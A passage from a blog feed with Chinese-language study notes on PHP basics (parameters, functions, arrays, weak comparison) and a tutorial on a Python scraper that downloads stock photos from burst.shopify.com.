class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">1</span>;<span class="variable">$i</span>&lt;<span class="number">10</span>;<span class="variable">$i</span>++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;di <span class="subst">&#123;$i&#125;</span>cao zuo &lt;br /&gt;&quot;</span> ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如下图，可以看到语句被执行了九次</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60f0e51792e54.jpg"></p><p>5.<strong>break</strong>语句<br>​                    作用：用于switch语句，for，while，do…while，foreach，用于中断这些语句！<br>​                    后面可以接上一个数字来表示跳出几层循环！默认不加就是跳出当前循环语句！<br>​6.<strong>continue</strong>语句<br>​                    作用：只能用在循环语句，跳出本次循环，并不是结束整个循环语句！<br>​7.**exit()<strong>语句或</strong>die()**语句<br>​                    作用：结束当前整个程序的执行！ 函数输出一条消息，并退出当前脚本。</p><h3 id="1-7-GET传参"><a href="#1-7-GET传参" class="headerlink" title="1.7 GET传参"></a>1.7 GET传参</h3><blockquote><p>  GET是网页传值常用的一种方式，它能够将紧跟在域名后<strong>第一个问号后的值</strong>或者&amp;符号后面的值以GET数组的形式接收进页面</p></blockquote><blockquote><p><strong>GET传参特点</strong></p><p>1get方式传递的参数可以在页面上看见，So安全性不高，反之post安全性高<br>2get方式传递的速度快。<br>在后台定义了get,set方法可以直接获取，不用getParameter(“name”);<br>$.get(….) $.ajax(….) $.getJSON(….)3个都是ajax传递<br>只是方式不同。<br>$.get()是以get方式传递到后台<br>$.ajax()需要你配置传递到后台的方式，而且功能比$.get()方法多，建议使用这个方法<br>$.getJSON()传递的是json数据类型</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;d&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$a</span>&gt;<span class="variable">$c</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;nice success!&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;no&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>让我们打开本地网页看一下结果吧</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60f0f33310a7e.jpg"></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60f0f333119ac.jpg"></p><p>当我们输入<code>?b=2&amp;d=4</code>时，显然是d大，所以$a&lt;$c ,输出no</p><p>当我们输入?b=4&amp;d=2时，显然是b大，所以$a&gt;$c ,输出nice success!</p><h3 id="1-8-POST传参"><a href="#1-8-POST传参" class="headerlink" title="1.8 POST传参"></a>1.8 POST传参</h3><blockquote><p> <strong>Post</strong>请求有如下特性：数据是放在<strong>HTTP</strong>主体中的，其组织方式不只一种，有&amp;连接方式，也有分割符方式，可隐藏参数，传递大批数据，比较方便,也更安全，<strong>post</strong> 地址栏不会出现一大串?bjnghfgreygt这样的东西</p></blockquote><p>与GET传参的区别</p><blockquote><p><strong>Get</strong>是向服务器发索取数据的一种请求；而<strong>Post</strong>是向服务器提交数据的一种请求，要提交的数据位于信息头后面的实体中。</p><p>很理论化，但是很标准，method=“<strong>get</strong>”并不是从服务器上获取数据，<strong>get</strong>和<strong>post</strong> 只是发送机制不同，并不是一个取一个发！</p><p><strong>get</strong>方法会在IE地址栏里显示表示你提交时候所带的值；<strong>post</strong>方法不会</p></blockquote><ul><li>以下是一个简单的post传参代码</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$what</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;what&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$what</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$what</span>==<span class="string">&#x27;post&#x27;</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;你好呀，成功传参啦！&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60f1338f628ef.jpg"></p><p>如图我们用<strong>hackbar工具</strong>进行传参，让<code>what=post</code> 这样页面中输出了 你好呀，成功传参啦！</p><ul><li>以下是我自己编写的post传参代码，可以实现一个<strong>登录框</strong>的效果，登陆后也有回显，采用<strong>post传参</strong>方式</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>使用$_POST[]获取表单数据<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">&lt;?php if(!isset($_POST[&quot;submit&quot;])): ?&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;#&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">用户名：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">密码：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;登陆&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span>/&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">&lt;?php endif; ?&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">if(isset($_POST[&quot;submit&quot;]))&#123;</span><br><span class="line">$name=$_POST[&quot;username&quot;];</span><br><span class="line">$pw=$_POST[&quot;password&quot;];</span><br><span class="line">echo &quot;欢迎登陆！,$name&quot;;</span><br><span class="line">echo &quot;<span class="tag">&lt;<span class="name">br</span>/&gt;</span>&quot;; </span><br><span class="line">echo &quot;<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&#x27;JavaScript:history.back()&#x27;</span>&gt;</span>退出登录<span class="tag">&lt;/<span class="name">a</span>&gt;</span>&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>效果如下图</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60f1349998a35.jpg"></p><p>当我们提交表单后，可以发现页面跳转</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60f13465115b4.jpg"></p><h3 id="1-9-函数"><a href="#1-9-函数" class="headerlink" title="1.9 函数"></a>1.9 函数</h3><p>1.function 函数名([形式参数1,形式参数2,….形式参数n]){</p><p>​            }</p><p>2.PHP变量的范围</p><p>​        1.<u>局部变量</u><br>​                function test(){<br>​                $a=1;//局部变量$a，尽在这个函数内部有效<br>​                }<br>​                echo $a;</p><p>​        2.全局变量<br>​                $i=10;//全局变量（外部变量）<br>​                define(‘MY_NAME’,’孙胜利’);<br>​                function test(){<br>​                echo MY_NAME;<br>​                <strong><u><em>global</em></u></strong> $i;//声明$i为全局变量,然后再这个函数内部就可以使用$i<br>​                echo $i;<br>​                $a=1;<br>​                }<br>​                test();</p><p>​        3.静态变量<br>​                function test(){<br>​                static $a=10;//静态变量$a,初始化静态变量,尽在第一次调用的时候执行<br>​                echo ++$a;//当第二次执行这个函数的时候$a这个变量依然存在并且里面的也值依然存在！<br>​                }</p><p>​        4.参数的传递</p><p>​                1)按值传递参数(默认,最常用)</p><p>​                        function test($a){}</p><p>​                        $i=10</p><p>​                        text($i)</p><p>​                2)按引用传递参数(相当于形式参数和实际参数指的是同一个)</p><p>​                        function text(&amp;$a){}</p><p>​                        $i=10</p><p>​                        text($i)       /* $i的值始终与$a相等*/</p><p>​                3)函数的默认参数</p><p>​                        给形式参数加默认值的时候是重右往左加的    </p><p>​                3).可变长度参数列表</p><p>​                        func_get_args();（可以调用函数里的全部参数）<br>​                        func_get_arg();（类似数组，括号里输入数字可以获取第几个实参）<br>​                        func_num_args();（获取调用的参数数量）</p><p>​        5.递归函数</p><p>​            <strong>递归函数即在函数内部自己调用自己的函数。</strong></p><p>​            1)里面的变量默认都是局部变量，相互之间没有影响！没有联系，只是存储了数据。</p><p>​            2)递归函数，在函数的内部需要有适时结束函数运行的条件！</p><p>​            3)为什么要回归？</p><p>​            因为之前的程序没执行完，只执行了if语句，当n=0时返回上一级调用它的地方，即输出<code>%n.&amp;nbsp</code></p><p>下图为递归函数流程图</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60f0e912a00d7.jpg"></p><h3 id="2-0数组"><a href="#2-0数组" class="headerlink" title="2.0数组"></a>2.0数组</h3><p>​    1.array()函数  变量名称[索引值]=数据    变量名称[]=数据  （从0开始） 也可用索引值=&gt;数据导入</p><p>​    多维数组：变量名称[]]]</p><p>​    2.数组遍历</p><p>​    1) for循环<br>​    2) foreach语句</p><p>​        <code>foreach(数组变量 as 变量1)&#123;</code></p><p>​                <code>echo 变量1;</code></p><p>​        <code>&#125;</code></p><p>​        <code>foreach(数组变量 as 变量1=&gt;变量2)&#123;</code></p><p>​                    <code>cho 变量1.&#39;=&gt;&#39;.变量2;</code></p><p>​        <code>&#125;</code></p><h2 id="PHP弱类型比较"><a href="#PHP弱类型比较" class="headerlink" title="PHP弱类型比较"></a>PHP弱类型比较</h2><p> <strong>1.****==与===</strong></p><p>==为弱相等，也就是说12==”12” –&gt; true，而且12==”12cdf” –&gt; true，只取字符串中开头的整数部分，但是1e3dgf这样的字符串在比较时，取的是符合科学计数法的部分：1e3，也就是1000.</p><p>而且bool类型的true和任意字符串的弱类型相等</p><p>===为完全相等，数据类型和值都相等时返回true。</p><h2 id="CTF中见到过的函数整理"><a href="#CTF中见到过的函数整理" class="headerlink" title="CTF中见到过的函数整理"></a>CTF中见到过的函数整理</h2><ul><li>in_array（$x1,$x2）（判断x1是否匹配x2，或在不在数组中）</li><li>is_string（判断是否为字符串）</li><li>mb_substr（$page，0，2）（是一个截断函数，返回0—2之间的内容）</li><li>mb_strpos（查找字符串在另一个字符串中首次出现的位置）</li><li>strstr（””$1”,”$2”）（查找 “$2” 在 “$1” 中是否存在，如果是，返回该字符串及后面剩余部分：）</li><li>str_replace(“$1”,”$2”,”$3”)（把$3中的字符$1替换成$2）</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 align = &quot;center&quot;&gt;PHP学习笔记&lt;h1



&lt;h2 id=&quot;😀编写代码及其部署环境&quot;&gt;&lt;a href=&quot;#😀编写代码及其部署环境&quot; class=&quot;headerlink&quot; title=&quot;😀编写代码及其部署环境&quot;&gt;&lt;/a&gt;😀编写代码及其部署环境&lt;/h</summary>
      
    
    
    
    <category term="-PHP" scheme="https://abinix.top/categories/PHP/"/>
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://abinix.top/2021/04/20/%E7%88%AC%E8%99%AB/"/>
    <id>https://abinix.top/2021/04/20/%E7%88%AC%E8%99%AB/</id>
    <published>2021-04-20T14:19:34.634Z</published>
    <updated>2021-08-12T16:42:28.536Z</updated>
    
    <content type="html"><![CDATA[<p>title: 爬虫与面向对象爬虫<br>author: A.bin<br>cover: /img/5.jpg<br>top_img: /img/7.jpg<br>tags:</p><ul><li>‘-爬虫 -面向对象’<br>categories:</li><li>‘-Python’<br>date: 2021-04-21 18:50:00</li></ul><h1 align = "center">爬虫笔记</h1><p><strong>爬取burst.shopify.com内容</strong></p><p>[TOC]</p><h1 id="总体思想"><a href="#总体思想" class="headerlink" title="总体思想"></a>总体思想</h1><ol><li>​    观察网页构造，为写代码做准备，检查是否有反爬技术</li><li>​    检查所要下载的图片，观察格式，并且构造正则表达式</li><li>​    过滤重复的图片</li><li>​    保存图片，并作相关优化</li></ol><h1 id="实现效果"><a href="#实现效果" class="headerlink" title="实现效果"></a>实现效果</h1><ol><li>可批量下载照片</li><li>可选择类别下载</li><li>编写面向对象程序爬取</li></ol><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210802102824.png"></p><h1 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h1><p>打开burst.shopify.com网页，观察其结构</p><p>观察到当我们打开一个类别的图片使，url中就将目录切换至类别下，这一点有助于我们后续的<strong>代码优化</strong>，可根据类别下载等</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210802103600.png"></p><p>我们可以用F12观察网页源代码，根据图片的路径来进行爬虫的抓取</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210802104058.png"></p><p>如上图，这一段就是这张图片在网页中的位置，我们打开图片的位置，在浏览器中显示图片</p><p><strong>可以发现这里有一堆的jpg文件，并且都是一张照片，这里我就要想到后期要进行去重，不能有重复的照片显示出来</strong></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210802104154.png"></p><p>如上图，但是我们可以发现，这张图片并不是高清图片，观察url后可以发现，.jpg后面传参了一堆数据</p><p><code>https://burst.shopifycdn.com/photos/love-letters-and-hearts.jpg?width=746&amp;format=pjpg&amp;exif=0&amp;iptc=0</code></p><p>我们将？后面的去掉后可以发现</p><p>![image-20210802104433046](C:\Users\Pro 13\AppData\Roaming\Typora\typora-user-images\image-20210802104433046.png)</p><p>变成了高清带图（这里试错了很多次）</p><p>这一部分有助于我们后面的<strong>正则过滤</strong></p><p>更换第二页时，url回显如上，有助于我们后期代码优化</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210802104641.png"></p><h1 id="代码编写"><a href="#代码编写" class="headerlink" title="代码编写"></a>代码编写</h1><ul><li><h2 id="引用库"><a href="#引用库" class="headerlink" title="引用库"></a>引用库</h2><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210802105103.png"></p><p>运用re库来进行正则匹配</p><p>运用requests库来获取HTTP的请求</p></li></ul><ul><li><h2 id="设置头，反爬"><a href="#设置头，反爬" class="headerlink" title="设置头，反爬"></a>设置头，反爬</h2><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210802105623.png"></p><blockquote><p>user-agent属性值为python-requests，在很多网站爬取的过程中，会被拦截</p><p>当被拦截时，请求失效</p></blockquote><p>所以我们要伪装成一个正常的用户，这时设置头便是最简单的方法伪装成用户了</p><p>头的查看很简单，打开f12，下图中的红框框就是</p><p>我们在代码中提前申明，后面再调用即可</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210802105855.png"></p></li></ul><ul><li><h2 id="正则部分"><a href="#正则部分" class="headerlink" title="正则部分"></a>正则部分</h2><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210802105927.png"></p><p>这一部分代码用来请求url，并且运用re库，进行正则的过滤来获取我们想要的信息</p><p>正则的用法如下图：</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/6080384636f52.jpg"></p></li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/6080393d36a4d.jpg"></p><p>​    最常用的便是 <strong>.*?</strong> 可以过滤一些常用的，我这里也用到了</p><p>​    <code>re.findall(&quot;https://burst.*?jpg&quot;, html)</code>这段代码意思是使用re模块匹配源码    中为jpg的文件，并且只匹配到jpg，这也说明我们只匹配了高清大图，符合我们的需求</p><ul><li><h2 id="代码去重"><a href="#代码去重" class="headerlink" title="代码去重"></a>代码去重</h2><p>上面说到会有重复的图片所以我们要根据程序来去重</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210802110351.png"></p><p>使用i来遍历请求，只要i不在这个列表中，（如果重复了，则被过滤掉了）则抓取图片</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210802110608.png"></p><p>这一部分的代码用来过滤新一页中会有重复的部分，思路一致</p></li></ul><ul><li><h2 id="保存图片"><a href="#保存图片" class="headerlink" title="保存图片"></a>保存图片</h2><p>抓取的图片我们要将图片保存，这里用到open函数进行保存</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210802110651.png"></p><p>并且设置计数功能，记录当前下载的图片数</p></li></ul><ul><li><h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><ol><li>根据图片位置为图片编号，以便后续操作</li><li>设置多页面下载</li><li>查看是否完全去重</li></ol></li><li><h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">A.bin</span></span><br><span class="line"><span class="string">21.7.22</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">x=<span class="number">0</span></span><br><span class="line">j=<span class="number">1</span></span><br><span class="line">count=<span class="number">0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&#x27;animals&#x27; &#x27;city&#x27; &#x27;home&#x27; &#x27;seasons&#x27; &#x27;education&#x27; &#x27;landscape&#x27; &#x27;family&#x27; \n &quot;</span></span><br><span class="line">      <span class="string">&quot;&#x27;love&#x27; &#x27;around the world&#x27; &#x27;arts&#x27; &#x27;technology&#x27; &#x27;outdoor&#x27; &#x27;backgrounds&#x27; \n &quot;</span></span><br><span class="line">      <span class="string">&quot;&#x27;fashion&#x27; &#x27;beauty&#x27; &#x27;people&#x27; &#x27;transportation&#x27; &#x27;business&#x27; \n &quot;</span></span><br><span class="line">      <span class="string">&quot;&#x27;fitness&#x27; &#x27;travel&#x27; &#x27;flowers&#x27; &#x27;work&#x27; &#x27;food&#x27; &#x27;holidays&#x27; &#x27;celebrate&#x27;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#&#123;设置头，反爬&#125;</span></span><br><span class="line">headers=&#123;</span><br><span class="line"><span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">key = <span class="built_in">input</span>(<span class="string">&#x27;请从上面挑选出要下载的图片类型：&#x27;</span>)</span><br><span class="line">num = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;请输入一共要下载的页数：&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># &#123;请求url与编写正则表达式&#125;</span></span><br><span class="line"><span class="keyword">if</span> num &gt;= <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">while</span> j &lt;= num:</span><br><span class="line">        url = <span class="string">&#x27;https://burst.shopify.com/&#x27;</span> + key + <span class="string">&#x27;?page=&#x27;</span> + <span class="built_in">str</span>(j)</span><br><span class="line">        resp=requests.get(url,headers=headers)</span><br><span class="line">        html=resp.text</span><br><span class="line">        urls=re.findall(<span class="string">&quot;https://burst.*?jpg&quot;</span>, html)</span><br><span class="line">        lst=[]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># &#123;当第二页刷新时有和第一页相同的图片,所以以下为去重代码&#125;</span></span><br><span class="line">        <span class="keyword">if</span> j == <span class="number">1</span> :</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> urls:   <span class="comment">#遍历jpg</span></span><br><span class="line">                <span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> lst:</span><br><span class="line">                    lst.append(i)</span><br><span class="line">        <span class="keyword">elif</span> j&gt;<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> urls:</span><br><span class="line">                <span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> lst2 <span class="keyword">and</span> i <span class="keyword">not</span> <span class="keyword">in</span> lst:  <span class="comment">#判断新urls里的jpg是否与lst列表里的相同</span></span><br><span class="line">                    lst.append(i)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># &#123;保存图片&#125;</span></span><br><span class="line">        <span class="keyword">for</span> url <span class="keyword">in</span> lst:</span><br><span class="line">            file_name =<span class="string">&quot;E:/大学/python爬虫/&quot;</span>+ <span class="built_in">str</span>(j) + <span class="string">&#x27;.&#x27;</span> + <span class="built_in">str</span>(x) + <span class="string">&quot;.jpg&quot;</span>   <span class="comment">#设置文件名</span></span><br><span class="line">            resp = requests.get(url, headers=headers)</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(file_name, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:    <span class="comment">#以二进制的方式写进</span></span><br><span class="line">                f.write(resp.content)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;正在下载第&#123;0&#125;页第&#123;1&#125;张图片&quot;</span>.<span class="built_in">format</span>(j,x))</span><br><span class="line">            x=x+<span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># &#123;计数部分&#125;</span></span><br><span class="line">            <span class="keyword">if</span> x==<span class="built_in">len</span>(lst):</span><br><span class="line">                <span class="keyword">if</span> j != <span class="number">1</span>:</span><br><span class="line">                    <span class="keyword">pass</span>        <span class="comment"># 这一部分if指lst2=lst只执行一次，</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    lst2 = lst</span><br><span class="line">                x=<span class="number">0</span></span><br><span class="line">                j=j+<span class="number">1</span></span><br><span class="line">                count += <span class="built_in">len</span>(lst)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;下载完成！共下载&#123;0&#125;张图片&quot;</span>.<span class="built_in">format</span>(count))</span><br></pre></td></tr></table></figure></li></ul><h2 id="最终效果"><a href="#最终效果" class="headerlink" title="最终效果"></a>最终效果</h2><p>运行程序</p><p>根据分类可以进行选择下载的类型 选择 <strong>food</strong> 吧</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210802111105.png"></p><p>选择页数后，即可下载</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210802140217.png"></p><p>打开保存图片的文件夹，下载中……….</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210802140330.png"></p><p>如下图，下载完成，显示最终下载数目</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210802141548.png"></p><p>如下图，文件夹中塞满了图片，下载完成！</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210802141723.png"></p><h2 id="使用面向对象来爬取"><a href="#使用面向对象来爬取" class="headerlink" title="使用面向对象来爬取"></a>使用面向对象来爬取</h2><p>面向对象也就是通过创建一个类，再创建若干个对象，然后再统一调动，我是在自己之前写的代码基础上进行修改</p><p><strong>代码如下：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> urlretrieve</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Tupian</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.base_url=<span class="string">&quot;https://burst.shopify.com/love?page=&#123;&#125;&quot;</span></span><br><span class="line">        self.header=&#123;<span class="string">&quot;user-agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36&quot;</span></span><br><span class="line">                     &#125;</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Geturl</span>(<span class="params">self</span>):</span></span><br><span class="line">        all_url = []</span><br><span class="line">        <span class="keyword">for</span> <span class="built_in">str</span> <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">3</span>):</span><br><span class="line">            all_url.append(self.base_url.<span class="built_in">format</span>(<span class="built_in">str</span>))</span><br><span class="line">        <span class="keyword">return</span> all_url</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Respons</span>(<span class="params">self,all_url</span>):</span></span><br><span class="line">        text_list = []</span><br><span class="line">        <span class="keyword">for</span> url <span class="keyword">in</span> all_url:</span><br><span class="line">            r = requests.get(url, headers=self.header)</span><br><span class="line">            text_list.append(r.text)</span><br><span class="line">        <span class="keyword">return</span> text_list</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">clear</span>(<span class="params">self, respons</span>):</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> respons:</span><br><span class="line">            qqq = <span class="string">&quot;https://burst.*?jpg&quot;</span></span><br><span class="line">            pi = re.findall(qqq, i)</span><br><span class="line">            lst=[]</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> pi:   <span class="comment">#遍历jpg</span></span><br><span class="line">                <span class="keyword">if</span> j <span class="keyword">not</span> <span class="keyword">in</span> lst:</span><br><span class="line">                    lst.append(j)</span><br><span class="line">            <span class="keyword">return</span> lst</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">save</span>(<span class="params">self, url_list</span>):</span></span><br><span class="line">        x=<span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> url <span class="keyword">in</span> url_list:</span><br><span class="line">            x = x + <span 